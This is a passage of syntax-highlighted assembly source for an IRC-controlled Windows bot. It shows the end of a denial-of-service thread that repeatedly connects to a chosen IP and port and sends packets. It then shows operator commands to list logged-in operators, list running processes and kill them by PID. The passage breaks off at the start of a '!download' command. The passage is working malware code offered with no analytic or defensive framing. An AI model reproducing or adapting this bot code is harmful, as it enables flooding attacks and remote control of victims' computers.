            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">DOS_IP</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; sin_addr</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">DOS_port</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htons</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">

            </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_connect</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_1</span><span class="sc0">
            
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">DOS_packet_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end_1</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">DOS_packet_size</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_1</span><span class="sc0">
            
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">DOS_interval</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DOS_flag</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">jecxnz</span><span class="sc0">  </span><span class="sc5">__cycle</span><span class="sc0">
                        
</span><span class="sc5">__end_1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DOS_flag</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">__DOS_xception</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
</span><span class="sc5">DOS_flag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">bot_DOS_thread</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; lists currently logged in ops</span><span class="sc0">
</span><span class="sc1">; format: !opers</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_opers</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">There</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">currently</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operators</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">ops</span><span class="sc0"> </span><span class="sc5">logged</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operators</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__copy</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__copy</span><span class="sc0">
            
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' ,'</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">operator</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__cycle</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; kills a process having specified PID</span><span class="sc0">
</span><span class="sc1">; format: !kill &lt;PID&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_kill</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROCESS_TERMINATE</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">OpenProcess</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">TerminateProcess</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">
            
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; list active processes on the system. displayes PATH &amp; PID</span><span class="sc0">
</span><span class="sc1">; format: !procs</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_procs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; thread param</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_procs_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_procs_thread</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_handle</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_entry</span><span class="sc4">:</span><span class="sc5">PROCESSENTRY32</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">msg</span><span class="sc0">
            
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__procs_exception</span><span class="sc4">&gt;</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">procsdlta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_PD</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">procsdlta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">  

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PRIVMSG</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">": "</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">TH32CS_SNAPPROCESS</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CreateToolhelp32Snapshot</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">p_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.dwSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PROCESSENTRY32</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Process32First</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_1</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry.szExeFile</span><span class="sc0">
</span><span class="sc5">__copy</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__copy</span><span class="sc0">
            
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PID</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry.th32ProcessID</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">bot_log_handle</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">msg</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end_1</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end_1</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1500</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Process32Next</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cycle</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
</span><span class="sc5">__end_1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">
            
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">

            </span><span class="sc6">leave</span><span class="sc0">
</span><span class="sc5">__procs_exception</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_PD</span><span class="sc0">

            
</span><span class="sc5">bot_procs_thread</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; downloads a file from http|ftp resource</span><span class="sc0">
</span><span class="sc1">; format: !download &lt;url&gt; &lt;file_name_to_save_to&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_download</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

